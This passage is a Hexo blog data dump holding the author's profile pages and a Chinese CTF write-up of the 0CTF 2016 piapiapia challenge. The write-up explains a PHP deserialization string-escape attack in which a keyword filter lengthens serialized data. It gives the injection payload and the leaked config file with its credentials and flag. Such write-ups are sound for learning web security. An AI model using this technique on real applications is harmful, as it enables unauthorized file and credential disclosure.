/buuoj刷题记录11.md","hash":"83a9cb3d00bb4371a9a573b2aba2a640ecfa80e1","modified":1580835329845},{"_id":"source/pic/62.png","hash":"43e93cf0596ed443747282afb37ed53b42068555","modified":1580824035417},{"_id":"source/pic/63.png","hash":"1c9b4d9cbc15488945b710d5478718a317deb587","modified":1580824091566},{"_id":"source/pic/64.png","hash":"7d9279c55d37887243e2af0f3cfe14fe2934a539","modified":1580824347534},{"_id":"source/pic/65.png","hash":"44d7b817742ba2485ecb339cfaac82d22d6784b4","modified":1580830475992}],"Category":[],"Data":[],"Page":[{"title":"关于我","date":"2019-12-23T14:09:50.000Z","comments":0,"_content":"\n一个只会一点点杂项的WEB手\n\n<img src=\"https://github.com/fluidicon.png\" alt=\"github\" align='left'  style=\"zoom:6%  ;\" />[GITHUB](https://github.com/sunny250)\n\n<img src=\"http://sqimg.qq.com/qq_product_operations/im/qqlogo/imlogo_b.png\" align='left' alt=\"QQ\" style=\"zoom: 57% ;\" />  209124513\n\n","source":"about/index.md","raw":"---\ntitle: 关于我\ndate: 2019-12-23 22:09:50\ncomments: false\n---\n\n一个只会一点点杂项的WEB手\n\n<img src=\"https://github.com/fluidicon.png\" alt=\"github\" align='left'  style=\"zoom:6%  ;\" />[GITHUB](https://github.com/sunny250)\n\n<img src=\"http://sqimg.qq.com/qq_product_operations/im/qqlogo/imlogo_b.png\" align='left' alt=\"QQ\" style=\"zoom: 57% ;\" />  209124513\n\n","updated":"2019-12-24T14:21:30.402Z","path":"about/index.html","layout":"page","_id":"ck4pc9e4h0000187egc7l9it6","content":"<p>一个只会一点点杂项的WEB手</p>\n<p><img src=\"https://github.com/fluidicon.png\" alt=\"github\" align='left'  style=\"zoom:6%  ;\" /><a href=\"https://github.com/sunny250\" target=\"_blank\" rel=\"noopener\">GITHUB</a></p>\n<p><img src=\"http://sqimg.qq.com/qq_product_operations/im/qqlogo/imlogo_b.png\" align='left' alt=\"QQ\" style=\"zoom: 57% ;\" />  209124513</p>\n","site":{"data":{}},"excerpt":"","more":"<p>一个只会一点点杂项的WEB手</p>\n<p><img src=\"https://github.com/fluidicon.png\" alt=\"github\" align='left'  style=\"zoom:6%  ;\" /><a href=\"https://github.com/sunny250\" target=\"_blank\" rel=\"noopener\">GITHUB</a></p>\n<p><img src=\"http://sqimg.qq.com/qq_product_operations/im/qqlogo/imlogo_b.png\" align='left' alt=\"QQ\" style=\"zoom: 57% ;\" />  209124513</p>\n"},{"title":"友链","date":"2019-12-23T14:08:02.000Z","_content":"\n排名不分先后\n\nP牛（离别歌）https://www.leavesongs.com\n\n腹黑  http://www.lovei.org/\n\n赵师傅 https://www.zhaoj.in/\n\n咲夜南梦 https://196011564.github.io\n\nP3rh4ps http://P3rh4ps.top\n\n15h3na0 https://15h3na0.xyz/\n\n小帽 https://yikongge.github.io/","source":"links/index.md","raw":"---\ntitle: 友链\ndate: 2019-12-23 22:08:02\n---\n\n排名不分先后\n\nP牛（离别歌）https://www.leavesongs.com\n\n腹黑  http://www.lovei.org/\n\n赵师傅 https://www.zhaoj.in/\n\n咲夜南梦 https://196011564.github.io\n\nP3rh4ps http://P3rh4ps.top\n\n15h3na0 https://15h3na0.xyz/\n\n小帽 https://yikongge.github.io/","updated":"2020-02-06T08:17:02.165Z","path":"links/index.html","_id":"ck4pc9e4p0002187e0j0r3ipt","comments":1,"layout":"page"},{"title":"标签","date":"2019-12-23T14:07:42.000Z","type":"tags","_content":"","source":"tags/index.md","raw":"---\ntitle: 标签\ndate: 2019-12-23 22:07:42\ntype: \"tags\"\n---\n","updated":"2019-12-26T07:50:35.063Z","path":"tags/index.html","comments":1,"layout":"page","_id":"ck4pc9e5u000u187efkvxauj1","content":"","site":{"data":{}},"excerpt":"","more":""}],"Post":[{"title":"buuoj刷题记录1","date":"2019-12-23T11:44:18.000Z","_content":"\n## [0CTF 2016]piapiapia\n\n### 0x00 基础\n\n一般文件的目录又xxx.php.bak/swp，或者查看元素、robots.txt里面有提示，或者`www.zip`等一系列文件中出现网站源码。也可以使用工具扫描\n\nPHP序列化[参考文章](https://www.php.cn/php-notebook-239422.html)\n\n<!--more-->\n\n### 0x01 分析\n\n题中`www.zip`中包含源码，下载~~后进行代码审计（不会）~~翻阅PHP手册，各种百度。在config.php中包含flag，要想办法获取到此文件\nconfig.php\n\n```\n<?php\n    $config['hostname'] = '127.0.0.1';\n    $config['username'] = 'root';\n    $config['password'] = '';\n    $config['database'] = '';\n    $flag = '';\n?>\n```\n查看index.php\n\n```php\nif($user->login($username, $password)) {\n\t\t\t$_SESSION['username'] = $username;\n\t\t\theader('Location: profile.php');//登入后跳转到profile.php\n\t\t\texit;\t\n\t\t}\n```\n\n查看profile.php\n\n```PHP\n<?php   \n    require_once('class.php');\nif($_SESSION['username'] == null) { \n    die('Login First');\n}   \n$username = $_SESSION['username'];\n$profile=$user->show_profile($username);\nif($profile  == null) { \n    header('Location: update.php'); //$profile为空，跳转到update.php\n}\nelse { \n    $profile = unserialize($profile); //一般看见unserialize()会考虑反序列化漏洞，\n    $phone = $profile['phone']; \n    $email = $profile['email']; \n    $nickname = $profile['nickname'];\n    $photo = base64_encode(file_get_contents($profile['photo']));//file_get_contents()此函数可以获得文件内容\n}\n?>\n```\n\nupdate.php\n\n```php\nif($_POST['phone'] && $_POST['email'] && $_POST['nickname'] && $_FILES['photo']) {\n\n    $username = $_SESSION['username'];\n    if(!preg_match('/^\\d{11}$/', $_POST['phone']))\n        die('Invalid phone');\n\n    if(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\\.[_a-zA-Z0-9]{1,10}$/', $_POST['email']))\n        die('Invalid email');\n\nif(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)\n    die('Invalid nickname');\n\n    $file = $_FILES['photo'];\n    if($file['size'] < 5 or $file['size'] > 1000000)\n        die('Photo size error');\n\n    move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));\n    $profile['phone'] = $_POST['phone'];\n    $profile['email'] = $_POST['email'];\n    $profile['nickname'] = $_POST['nickname'];\n    $profile['photo'] = 'upload/' . md5($file['name']);\n\n    $user->update_profile($username, serialize($profile));//将$profile序列化，执行过滤函数\n    echo 'Update Profile Success!<a href=\"profile.php\">Your Profile</a>';\n}\n```\n查看update_profile()函数\n```PHP\npublic function update_profile($username, $new_profile) {\n    $username = parent::filter($username);\n    $new_profile = parent::filter($new_profile); \n    $where = \"username = '$username'\"; \n    return parent::update($this->table, 'profile', $new_profile, $where);\n}\n```\n查看filter()函数\n```php\npublic function filter($string) {\n    $escape = array('\\'', '\\\\\\\\'); \n    $escape = '/' . implode('|', $escape) . '/'; \n    $string = preg_replace($escape, '_', $string); //将  “ ‘ ”、 “\\\\\\\\” 替换成 “_” \n    $safe = array('select', 'insert', 'update', 'delete', 'where');\n    $safe = '/' . implode('|', $safe) . '/i';\n    return preg_replace($safe, 'hacker', $string); //将“ select|insert|update|delete|where” 替换成 \"hacker\"，返回替换后的字符串\n}\n```\n\n在update_profile()，返回到profile.php.\n\n```php\n$profile = unserialize($profile); //反序列化$profile\n    $phone = $profile['phone']; \n    $email = $profile['email']; \n    $nickname = $profile['nickname'];\n    $photo = base64_encode(file_get_contents($profile['photo']));\n\n```\n\n序列化后\n\n```\n$profile=a:4:{s:5:\"phone\";s:11:\"11111111111\";s:5:\"email\";s:8:\"12@12.12\";s:8:\"nickname\";s:4:\"1234\";s:5:\"photo\";s:39:\"upload/d41d8cd98f00b204e9800998ecf8427e\";}\n```\n要让$photo得到的文件是config.php也就是\n\n```\ns:5:\"photo\";s:39:\"upload/d41d8cd98f00b204e9800998ecf8427e\";\n```\n变成 \n```\ns:5:\"photo\";s:10:\"config.php\";\n```\n序列化后的长度是固定的，但是在经过过滤函数时候，nickname传入where会被替换成hacker,多出一个字符，这样就可以修改反序列化后的photo所对应的文件，使其为config.php。\n\n因为nickname有长度限制使用数组可以绕过\n\n```php\nif(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)\n    die('Invalid nickname');\n```\n让nickname的值为`\"};s:5:\"photo\";s:10:\"config.php\";}`长度为34,传入34个where\n### 0x03 开始操作\n\n![1](/pic/1.png) 传入参数\n\n访问profile.php\n\n![2](/pic/2.png)\n\n将base64解码\n\n\n```php\n<?php\n$config['hostname'] = '127.0.0.1';\n$config['username'] = 'root';\n$config['password'] = 'qwertyuiop';\n$config['database'] = 'challenges';\n$flag = 'flag{94b7c4b2-866d-4189-9b0a-abdf22990071}';\n?>\n```\n\n","source":"_posts/buuoj刷题记录1.md","raw":"---\ntitle: buuoj刷题记录1\ndate: 2019-12-23 19:44:18\ntags: \n - ctf\n - buuctf\n - web\n - 0CTF\n---\n\n## [0CTF 2016]piapiapia\n\n### 0x00 基础\n\n一般文件的目录又xxx.php.bak/swp，或者查看元素、robots.txt里面有提示，或者`www.zip`等一系列文件中出现网站源码。也可以使用工具扫描\n\nPHP序列化[参考文章](https://www.php.cn/php-notebook-239422.html)\n\n<!--more-->\n\n### 0x01 分析\n\n题中`www.zip`中包含源码，下载~~后进行代码审计（不会）~~翻阅PHP手册，各种百度。在config.php中包含flag，要想办法获取到此文件\nconfig.php\n\n```\n<?php\n    $config['hostname'] = '127.0.0.1';\n    $config['username'] = 'root';\n    $config['password'] = '';\n    $config['database'] = '';\n    $flag = '';\n?>\n```\n查看index.php\n\n```php\nif($user->login($username, $password)) {\n\t\t\t$_SESSION['username'] = $username;\n\t\t\theader('Location: profile.php');//登入后跳转到profile.php\n\t\t\texit;\t\n\t\t}\n```\n\n查看profile.php\n\n```PHP\n<?php   \n    require_once('class.php');\nif($_SESSION['username'] == null) { \n    die('Login First');\n}   \n$username = $_SESSION['username'];\n$profile=$user->show_profile($username);\nif($profile  == null) { \n    header('Location: update.php'); //$profile为空，跳转到update.php\n}\nelse { \n    $profile = unserialize($profile); //一般看见unserialize()会考虑反序列化漏洞，\n    $phone = $profile['phone']; \n    $email = $profile['email']; \n    $nickname = $profile['nickname'];\n    $photo = base64_encode(file_get_contents($profile['photo']));//file_get_contents()此函数可以获得文件内容\n}\n?>\n```\n\nupdate.php\n\n```php\nif($_POST['phone'] && $_POST['email'] && $_POST['nickname'] && $_FILES['photo']) {\n\n    $username = $_SESSION['username'];\n    if(!preg_match('/^\\d{11}$/', $_POST['phone']))\n        die('Invalid phone');\n\n    if(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\\.[_a-zA-Z0-9]{1,10}$/', $_POST['email']))\n        die('Invalid email');\n\nif(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)\n    die('Invalid nickname');\n\n    $file = $_FILES['photo'];\n    if($file['size'] < 5 or $file['size'] > 1000000)\n        die('Photo size error');\n\n    move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));\n    $profile['phone'] = $_POST['phone'];\n    $profile['email'] = $_POST['email'];\n    $profile['nickname'] = $_POST['nickname'];\n    $profile['photo'] = 'upload/' . md5($file['name']);\n\n    $user->update_profile($username, serialize($profile));//将$profile序列化，执行过滤函数\n    echo 'Update Profile Success!<a href=\"profile.php\">Your Profile</a>';\n}\n```\n查看update_profile()函数\n```PHP\npublic function update_profile($username, $new_profile) {\n    $username = parent::filter($username);\n    $new_profile = parent::filter($new_profile); \n    $where = \"username = '$username'\"; \n    return parent::update($this->table, 'profile', $new_profile, $where);\n}\n```\n查看filter()函数\n```php\npublic function filter($string) {\n    $escape = array('\\'', '\\\\\\\\'); \n    $escape = '/' . implode('|', $escape) . '/'; \n    $string = preg_replace($escape, '_', $string); //将  “ ‘ ”、 “\\\\\\\\” 替换成 “_” \n    $safe = array('select', 'insert', 'update', 'delete', 'where');\n    $safe = '/' . implode('|', $safe) . '/i';\n    return preg_replace($safe, 'hacker', $string); //将“ select|insert|update|delete|where” 替换成 \"hacker\"，返回替换后的字符串\n}\n```\n\n在update_profile()，返回到profile.php.\n\n```php\n$profile = unserialize($profile); //反序列化$profile\n    $phone = $profile['phone']; \n    $email = $profile['email']; \n    $nickname = $profile['nickname'];\n    $photo = base64_encode(file_get_contents($profile['photo']));\n\n```\n\n序列化后\n\n```\n$profile=a:4:{s:5:\"phone\";s:11:\"11111111111\";s:5:\"email\";s:8:\"12@12.12\";s:8:\"nickname\";s:4:\"1234\";s:5:\"photo\";s:39:\"upload/d41d8cd98f00b204e9800998ecf8427e\";}\n```\n要让$photo得到的文件是config.php也就是\n\n```\ns:5:\"photo\";s:39:\"upload/d41d8cd98f00b204e9800998ecf8427e\";\n```\n变成 \n```\ns:5:\"photo\";s:10:\"config.php\";\n```\n序列化后的长度是固定的，但是在经过过滤函数时候，nickname传入where会被替换成hacker,多出一个字符，这样就可以修改反序列化后的photo所对应的文件，使其为config.php。\n\n因为nickname有长度限制使用数组可以绕过\n\n```php\nif(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)\n    die('Invalid nickname');\n```\n让nickname的值为`\"};s:5:\"photo\";s:10:\"config.php\";}`长度为34,传入34个where\n### 0x03 开始操作\n\n![1](/pic/1.png) 传入参数\n\n访问profile.php\n\n![2](/pic/2.png)\n\n将base64解码\n\n\n```php\n<?php\n$config['hostname'] = '127.0.0.1';\n$config['username'] = 'root';\n$config['password'] = 'qwertyuiop';\n$config['database'] = 'challenges';\n$flag = 'flag{94b7c4b2-866d-4189-9b0a-abdf22990071}';\n?>\n```\n\n","slug":"buuoj刷题记录1","published":1,"updated":"2019-12-28T13:18:48.074Z","_id":"ck4pc9e4m0001187efvop7z5v","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"0CTF-2016-piapiapia\"><a href=\"#0CTF-2016-piapiapia\" class=\"headerlink\" title=\"[0CTF 2016]piapiapia\"></a>[0CTF 2016]piapiapia</h2><h3 id=\"0x00-基础\"><a href=\"#0x00-基础\" class=\"headerlink\" title=\"0x00 基础\"></a>0x00 基础</h3><p>一般文件的目录又xxx.php.bak/swp，或者查看元素、robots.txt里面有提示，或者<code>www.zip</code>等一系列文件中出现网站源码。也可以使用工具扫描</p>\n<p>PHP序列化<a href=\"https://www.php.cn/php-notebook-239422.html\" target=\"_blank\" rel=\"noopener\">参考文章</a></p>\n<a id=\"more\"></a>\n\n<h3 id=\"0x01-分析\"><a href=\"#0x01-分析\" class=\"headerlink\" title=\"0x01 分析\"></a>0x01 分析</h3><p>题中<code>www.zip</code>中包含源码，下载<del>后进行代码审计（不会）</del>翻阅PHP手册，各种百度。在config.php中包含flag，要想办法获取到此文件<br>config.php</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">    $config[&#39;hostname&#39;] &#x3D; &#39;127.0.0.1&#39;;</span><br><span class=\"line\">    $config[&#39;username&#39;] &#x3D; &#39;root&#39;;</span><br><span class=\"line\">    $config[&#39;password&#39;] &#x3D; &#39;&#39;;</span><br><span class=\"line\">    $config[&#39;database&#39;] &#x3D; &#39;&#39;;</span><br><span class=\"line\">    $flag &#x3D; &#39;&#39;;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>查看index.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>($user-&gt;login($username, $password)) &#123;</span><br><span class=\"line\">\t\t\t$_SESSION[<span class=\"string\">'username'</span>] = $username;</span><br><span class=\"line\">\t\t\theader(<span class=\"string\">'Location: profile.php'</span>);<span class=\"comment\">//登入后跳转到profile.php</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">exit</span>;\t</span><br><span class=\"line\">\t\t&#125;</span><br></pre></td></tr></table></figure>\n\n<p>查看profile.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>   </span><br><span class=\"line\">    <span class=\"keyword\">require_once</span>(<span class=\"string\">'class.php'</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>($_SESSION[<span class=\"string\">'username'</span>] == <span class=\"keyword\">null</span>) &#123; </span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">'Login First'</span>);</span><br><span class=\"line\">&#125;   </span><br><span class=\"line\">$username = $_SESSION[<span class=\"string\">'username'</span>];</span><br><span class=\"line\">$profile=$user-&gt;show_profile($username);</span><br><span class=\"line\"><span class=\"keyword\">if</span>($profile  == <span class=\"keyword\">null</span>) &#123; </span><br><span class=\"line\">    header(<span class=\"string\">'Location: update.php'</span>); <span class=\"comment\">//$profile为空，跳转到update.php</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span> &#123; </span><br><span class=\"line\">    $profile = unserialize($profile); <span class=\"comment\">//一般看见unserialize()会考虑反序列化漏洞，</span></span><br><span class=\"line\">    $phone = $profile[<span class=\"string\">'phone'</span>]; </span><br><span class=\"line\">    $email = $profile[<span class=\"string\">'email'</span>]; </span><br><span class=\"line\">    $nickname = $profile[<span class=\"string\">'nickname'</span>];</span><br><span class=\"line\">    $photo = base64_encode(file_get_contents($profile[<span class=\"string\">'photo'</span>]));<span class=\"comment\">//file_get_contents()此函数可以获得文件内容</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>update.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>($_POST[<span class=\"string\">'phone'</span>] &amp;&amp; $_POST[<span class=\"string\">'email'</span>] &amp;&amp; $_POST[<span class=\"string\">'nickname'</span>] &amp;&amp; $_FILES[<span class=\"string\">'photo'</span>]) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    $username = $_SESSION[<span class=\"string\">'username'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!preg_match(<span class=\"string\">'/^\\d&#123;11&#125;$/'</span>, $_POST[<span class=\"string\">'phone'</span>]))</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">'Invalid phone'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!preg_match(<span class=\"string\">'/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\\.[_a-zA-Z0-9]&#123;1,10&#125;$/'</span>, $_POST[<span class=\"string\">'email'</span>]))</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">'Invalid email'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(preg_match(<span class=\"string\">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class=\"string\">'nickname'</span>]) || strlen($_POST[<span class=\"string\">'nickname'</span>]) &gt; <span class=\"number\">10</span>)</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">'Invalid nickname'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    $file = $_FILES[<span class=\"string\">'photo'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>($file[<span class=\"string\">'size'</span>] &lt; <span class=\"number\">5</span> <span class=\"keyword\">or</span> $file[<span class=\"string\">'size'</span>] &gt; <span class=\"number\">1000000</span>)</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">'Photo size error'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    move_uploaded_file($file[<span class=\"string\">'tmp_name'</span>], <span class=\"string\">'upload/'</span> . md5($file[<span class=\"string\">'name'</span>]));</span><br><span class=\"line\">    $profile[<span class=\"string\">'phone'</span>] = $_POST[<span class=\"string\">'phone'</span>];</span><br><span class=\"line\">    $profile[<span class=\"string\">'email'</span>] = $_POST[<span class=\"string\">'email'</span>];</span><br><span class=\"line\">    $profile[<span class=\"string\">'nickname'</span>] = $_POST[<span class=\"string\">'nickname'</span>];</span><br><span class=\"line\">    $profile[<span class=\"string\">'photo'</span>] = <span class=\"string\">'upload/'</span> . md5($file[<span class=\"string\">'name'</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">    $user-&gt;update_profile($username, serialize($profile));<span class=\"comment\">//将$profile序列化，执行过滤函数</span></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">'Update Profile Success!&lt;a href=\"profile.php\"&gt;Your Profile&lt;/a&gt;'</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>查看update_profile()函数</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">update_profile</span><span class=\"params\">($username, $new_profile)</span> </span>&#123;</span><br><span class=\"line\">    $username = <span class=\"keyword\">parent</span>::filter($username);</span><br><span class=\"line\">    $new_profile = <span class=\"keyword\">parent</span>::filter($new_profile); </span><br><span class=\"line\">    $where = <span class=\"string\">\"username = '$username'\"</span>; </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">parent</span>::update(<span class=\"keyword\">$this</span>-&gt;table, <span class=\"string\">'profile'</span>, $new_profile, $where);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>查看filter()函数</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">filter</span><span class=\"params\">($string)</span> </span>&#123;</span><br><span class=\"line\">    $escape = <span class=\"keyword\">array</span>(<span class=\"string\">'\\''</span>, <span class=\"string\">'\\\\\\\\'</span>); </span><br><span class=\"line\">    $escape = <span class=\"string\">'/'</span> . implode(<span class=\"string\">'|'</span>, $escape) . <span class=\"string\">'/'</span>; </span><br><span class=\"line\">    $string = preg_replace($escape, <span class=\"string\">'_'</span>, $string); <span class=\"comment\">//将  “ ‘ ”、 “\\\\\\\\” 替换成 “_” </span></span><br><span class=\"line\">    $safe = <span class=\"keyword\">array</span>(<span class=\"string\">'select'</span>, <span class=\"string\">'insert'</span>, <span class=\"string\">'update'</span>, <span class=\"string\">'delete'</span>, <span class=\"string\">'where'</span>);</span><br><span class=\"line\">    $safe = <span class=\"string\">'/'</span> . implode(<span class=\"string\">'|'</span>, $safe) . <span class=\"string\">'/i'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> preg_replace($safe, <span class=\"string\">'hacker'</span>, $string); <span class=\"comment\">//将“ select|insert|update|delete|where” 替换成 \"hacker\"，返回替换后的字符串</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在update_profile()，返回到profile.php.</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$profile = unserialize($profile); <span class=\"comment\">//反序列化$profile</span></span><br><span class=\"line\">    $phone = $profile[<span class=\"string\">'phone'</span>]; </span><br><span class=\"line\">    $email = $profile[<span class=\"string\">'email'</span>]; </span><br><span class=\"line\">    $nickname = $profile[<span class=\"string\">'nickname'</span>];</span><br><span class=\"line\">    $photo = base64_encode(file_get_contents($profile[<span class=\"string\">'photo'</span>]));</span><br></pre></td></tr></table></figure>\n\n<p>序列化后</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$profile&#x3D;a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:8:&quot;12@12.12&quot;;s:8:&quot;nickname&quot;;s:4:&quot;1234&quot;;s:5:&quot;photo&quot;;s:39:&quot;upload&#x2F;d41d8cd98f00b204e9800998ecf8427e&quot;;&#125;</span><br></pre></td></tr></table></figure>\n<p>要让$photo得到的文件是config.php也就是</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s:5:&quot;photo&quot;;s:39:&quot;upload&#x2F;d41d8cd98f00b204e9800998ecf8427e&quot;;</span><br></pre></td></tr></table></figure>\n<p>变成 </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;</span><br></pre></td></tr></table></figure>\n<p>序列化后的长度是固定的，但是在经过过滤函数时候，nickname传入where会被替换成hacker,多出一个字符，这样就可以修改反序列化后的photo所对应的文件，使其为config.php。</p>\n<p>因为nickname有长度限制使用数组可以绕过</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(preg_match(<span class=\"string\">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class=\"string\">'nickname'</span>]) || strlen($_POST[<span class=\"string\">'nickname'</span>]) &gt; <span class=\"number\">10</span>)</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">'Invalid nickname'</span>);</span><br></pre></td></tr></table></figure>\n<p>让nickname的值为<code>&quot;};s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code>长度为34,传入34个where</p>\n<h3 id=\"0x03-开始操作\"><a href=\"#0x03-开始操作\" class=\"headerlink\" title=\"0x03 开始操作\"></a>0x03 开始操作</h3><p><img src=\"/pic/1.png\" alt=\"1\"> 传入参数</p>\n<p>访问profile.php</p>\n<p><img src=\"/pic/2.png\" alt=\"2\"></p>\n<p>将base64解码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$config[<span class=\"string\">'hostname'</span>] = <span class=\"string\">'127.0.0.1'</span>;</span><br><span class=\"line\">$config[<span class=\"string\">'username'</span>] = <span class=\"string\">'root'</span>;</span><br><span class=\"line\">$config[<span class=\"string\">'password'</span>] = <span class=\"string\">'qwertyuiop'</span>;</span><br><span class=\"line\">$config[<span class=\"string\">'database'</span>] = <span class=\"string\">'challenges'</span>;</span><br><span class=\"line\">$flag = <span class=\"string\">'flag&#123;94b7c4b2-866d-4189-9b0a-abdf22990071&#125;'</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"<h2 id=\"0CTF-2016-piapiapia\"><a href=\"#0CTF-2016-piapiapia\" class=\"headerlink\" title=\"[0CTF 2016]piapiapia\"></a>[0CTF 2016]piapiapia</h2><h3 id=\"0x00-基础\"><a href=\"#0x00-基础\" class=\"headerlink\" title=\"0x00 基础\"></a>0x00 基础</h3><p>一般文件的目录又xxx.php.bak/swp，或者查看元素、robots.txt里面有提示，或者<code>www.zip</code>等一系列文件中出现网站源码。也可以使用工具扫描</p>\n<p>PHP序列化<a href=\"https://www.php.cn/php-notebook-239422.html\" target=\"_blank\" rel=\"noopener\">参考文章</a></p>","more":"<h3 id=\"0x01-分析\"><a href=\"#0x01-分析\" 